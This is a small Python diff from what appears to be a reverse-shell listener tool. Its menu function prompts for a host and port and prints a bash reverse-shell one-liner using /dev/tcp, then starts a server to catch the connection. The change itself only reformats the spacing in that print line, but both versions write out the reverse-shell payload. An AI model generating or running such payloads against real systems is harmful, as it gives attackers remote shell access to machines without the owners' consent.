@@ -111,7 +111,7 @@ def menuStartMultiServer(): #2
 
 def menuCreateScript(): #3
     sp = promptHostPort()
-    print h.COLOR_INFO+"bash &> /dev/tcp/"+sp[0]+"/"+str(sp[1])+" 0>&1"+h.ENDC
+    print h.COLOR_INFO + "bash &> /dev/tcp/" + sp[0] + "/" + str(sp[1]) + " 0>&1" + h.ENDC
     promptServerRun(sp[0],sp[1])
 
 def menuExit(): #4
